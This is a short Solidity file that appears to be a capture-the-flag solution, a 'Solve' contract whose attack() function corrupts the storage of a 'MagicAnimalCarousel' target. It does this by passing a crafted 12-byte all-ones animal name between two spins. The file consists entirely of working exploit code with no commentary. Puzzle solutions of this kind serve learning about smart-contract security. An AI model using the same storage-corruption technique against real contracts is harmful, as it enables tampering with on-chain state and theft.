// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IMagicAnimalCarousel {
    function setAnimalAndSpin(string calldata) external;
    function changeAnimal(string calldata, uint256) external;
    function encodeAnimalName(string calldata) external returns (uint256);
}
contract Solve {
    address target;
    bytes12 animal = bytes12(uint96(type(uint256).max));

    constructor(address _target) {
        target = _target;
    }
    function attack() public {
        IMagicAnimalCarousel(target).setAnimalAndSpin("AA");

        IMagicAnimalCarousel(target).changeAnimal(string(abi.encodePacked(animal)), 1);
        IMagicAnimalCarousel(target).setAnimalAndSpin("AAA");
    }
}